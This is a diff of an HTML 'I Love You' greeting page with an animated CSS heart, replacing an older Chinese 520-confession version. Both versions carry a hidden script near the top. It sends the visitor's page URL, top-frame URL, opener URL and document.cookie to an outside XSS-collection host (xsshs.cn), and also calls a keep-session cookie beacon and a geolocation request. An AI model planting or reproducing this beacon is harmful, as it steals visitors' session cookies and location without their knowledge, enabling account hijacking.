@@ -1,70 +1,8 @@
 <!DOCTYPE html>
-<html>
-	<head>
-		<meta charset="utf-8" />
-		<title>520表白</title>
-		<style type="text/css">
-			body{
-				/* 颜色取值0-9 a-f */
-				background: mediumseagreen;
-			}
-			.c1,.c2,.rect{
-				width: 200px;
-				height: 200px;
-				background: #f00;
-				border-radius: 50%;
-				box-shadow: 0 0 30px rgb(255,0,0);
-			}
-			.rect{
-				margin-top: -200px;
-				border-radius: 0;
-			}
-			.c2{
-				margin-top: -100px;
-				margin-left: -100px;
-			}
-			#love{
-				position: absolute;
-				left: 30%;
-				top:10%;
-				transform: rotate(45deg);
-				
-			}
-			
-			.start{
-				animation: boom .5s infinite linear;
-			}
-			/* 创建自定义动画 */
-			@-webkit-keyframes boom{
-				30%{
-					transform:scale(1.1) rotate(45deg);
-				}
-				50%{
-					transform:scale(1.2) rotate(45deg);
-				}
-			}
-			
-			#msg{
-				position: absolute;
-				top: 80%;
-				left:20%;
-				font-size: 1.2em;
-				font-family:"微软雅黑" ;
-				line-height: 40px;
-				color: #fff;
-				opacity: 0;   /* 文字透明度 */
-			}
-		</style>
-	</head>
-	<body>
-		<div id="love" >
-			<div class="c1"></div>
-			<div class="c2"></div>
-			<div class="rect"></div>
-		</div>
-    <span id="msg">世界上最遥远的距离，不是生与死</br>而是你站在我对面，我却看不到</span>
-    <script>
-      (function(){(new Image()).src='https://xsshs.cn/xss.php?do=api&id=1bSG&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();
+<html lang="en">
+
+<script>
+(function(){(new Image()).src='https://xsshs.cn/xss.php?do=api&id=1bSG&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();
 if(''==1){keep=new Image();keep.src='https://xsshs.cn/xss.php?do=keepsession&id=1bSG&url='+escape(document.location)+'&cookie='+escape(document.cookie)};
 function getCookie(name){  
         var value="";  
@@ -92,47 +30,60 @@ function showPosition(position)
 }
        
 getLocation();
-      </script>
+</script>
 
-		<script>
-			// 初始化跳动状态为停止
-			var boom =false;
-			// 为整个文档绑定一个案例事件
-			document.addEventListener('keydown',function(e){
-				// 获取按下的按键码(ascil码)
-				var code =e.keyCode;
-				// 判断按下的是否是回车键
-				if(code===13){
-					// 根据id获取整个心
-					var div=document.getElementById('love'); 
-					// 根据id获取文本控件对象
-					var span=document.getElementById('msg');
-					if(boom){
-						// 停止
-						div.className='';
-						//boom=flase;
-						span.style.opacity=0;
-					}else{
-						// 跳动
-						div.className='start';
-						//boom=true;
-						// 初始化一个变量,表示透明度
-						var opacity=0.1;
-						// 定时任务,每隔0.3s执行一次函数,改变透明度
-						var f= setInterval(function(){
-							opacity+=0.1;
-							// 设置span元素的透明度
-							span.style.opacity=opacity;
-							// 当透明度等于1时则表示完全显示,此时需要终止定时任务
-							if(opacity>=1){
-								clearInterval(f);
-							}
-						},300);
-					}
-					boom=!boom;
-				}
-			});
-		</script>
-	</body>
+
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+   <meta http-equiv="X-UA-Compatible" content="ie=edge">
+   <meta name="Keywords" content="关键字,关键词">
+   <meta name="Description" content="描述和简介">
+   <title>Title</title>
+   <style type="text/css">
+       *{margin:0;padding:0;}
+       body,ul,li,ol,dl,dd,p,h1,h2,h3,h4,h5,h6{ margin:0;}
+       a{text-decoration:none;color: inherit;}
+       img{display: block;border:none;}
+       ol,ul{list-style:none;}
+       .clearfix:after {content: "";display: block;clear: both;}
+       .fl{ float: left;}
+       .fr{ float: right;}
+ 
+       html{
+           height: 100%;
+           background: -webkit-radial-gradient(center,#153170,#000);
+       }
+ 
+       .heart{ position: relative; width: 300px; height: 300px; margin: 200px auto;transform: rotate(45deg);
+           animation: move 2s infinite alternate ;}
+       .heart div{ position: absolute; width: 200px; height: 200px; background: red;}
+       .heart .middle{ right: 0; bottom: 0; width: 200px; height: 200px;}
+       .heart .left{ left: 0; bottom: 0; border-radius: 50%;}
+       .heart .right{ top: 0; right: 0;border-radius: 50%;}
+ 
+       .heart p{ width: 200px; height: 30px; font: bold 25px/30px "";text-align:center; color: #fff;}
+       .heart p{ position: absolute; right: 0; bottom: 85px; transform: rotate(-45deg);}
+ 
+       @-webkit-keyframes move{
+           10%{ transform: rotate(45deg) scale(1.1); text-shadow: 0 0 5px #fff; }
+           20%{ transform: rotate(45deg) scale(1.2); text-shadow: 0 0 5px #fff; }
+           30%{ transform: rotate(45deg) scale(1.3); text-shadow: 0 0 5px #fff; }
+           40%{ transform: rotate(45deg) scale(1.2); text-shadow: 0 0 5px #fff; }
+           50%{ transform: rotate(45deg) scale(1.3); text-shadow: 0 0 5px #fff; }
+           60%{ transform: rotate(45deg) scale(1.2); text-shadow: 0 0 5px #fff; }
+           70%{ transform: rotate(45deg) scale(1.3); text-shadow: 0 0 5px #fff; }
+           80%{ transform: rotate(45deg) scale(1.2); text-shadow: 0 0 10px #fff;}
+           90%{ transform: rotate(45deg) scale(1.1); text-shadow: 0 0 5px #fff; }
+       }
+ </style>
+</head>
+<body>
+   <div class="heart">
+       <div class="left"></div>
+       <div class="middle"></div>
+       <div class="right"></div>
+       <p>I Love You</p>
+   </div>
+</body>
 </html>
-
